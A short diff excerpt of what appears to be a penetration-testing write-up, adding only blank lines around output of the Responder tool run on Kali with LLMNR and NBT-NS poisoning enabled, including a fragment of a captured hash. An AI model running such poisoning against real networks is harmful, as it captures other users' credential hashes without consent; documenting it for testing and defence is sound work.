@@ -50,6 +50,7 @@ root@kali:~# responder -I eth0
   Author: Laurent Gaffie (laurent.gaffie@gmail.com)
   To kill this script hit CRTL-C
 
+
 [+] Poisoners:
     LLMNR                      [ON]
     NBT-NS                     [ON]
@@ -79,3 +80,5 @@ E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C
 [*] Skipping previously captured hash for \gX
 [+] Exiting...
 ```
+
+
